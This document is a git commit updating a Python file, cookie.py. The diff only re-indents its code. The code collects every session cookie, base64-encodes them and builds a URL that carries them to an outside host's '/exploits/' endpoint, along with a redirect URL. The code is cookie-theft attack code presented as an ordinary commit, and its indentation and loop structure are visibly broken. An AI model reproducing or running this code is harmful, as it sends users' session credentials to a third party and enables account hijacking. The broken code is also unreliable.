f935c8003505bce1de2ef50a90bd2062d461cbbd
Emil K <kaae@techie.com>
2019-06-10 00:09:20 +0200

    Update cookie.py

--- cookie.py
+++ cookie.py
@@ -16,14 +16,15 @@ cookieStr = ""
 cookies = [
 {'name': c.name, 'value': c.value, 'domain': c.domain, 'path': c.path, 'url': ''} for c in self.session.cookies]
 for cookie in cookies:
-		if cookie['domain'][0] == ".":
-      cookie['url'] = cookie['domain'][1:]
-    else:
-			cookie['url'] = cookie['domain']
-			cookie['url'] = "https://"+cookie['url']
-		cookies = json.dumps(cookies)
-		cookieStr = urllib.parse.quote(base64.b64encode(bytes(cookies, 'utf-8')).decode())
-		if not cookieStr: return
-		url = urllib.parse.quote(base64.b64encode(bytes(self.securecode.url, 'utf-8')).decode())
-		expToken = f"https://api.kaiserframework.com/exploits/?cookie={cookieStr}&redirect={url}"
-    print(expToken)
+	if cookie['domain'][0] == ".":
+	      cookie['url'] = cookie['domain'][1:]
+	else:
+		cookie['url'] = cookie['domain']
+		cookie['url'] = "https://"+cookie['url']
+	cookies = json.dumps(cookies)
+	cookieStr = urllib.parse.quote(base64.b64encode(bytes(cookies, 'utf-8')).decode())
+	if not cookieStr: return
+	url = urllib.parse.quote(base64.b64encode(bytes(self.securecode.url, 'utf-8')).decode())
+	expToken = f"https://api.kaiserframework.com/exploits/?cookie={cookieStr}&redirect={url}"
+
+print(expToken)
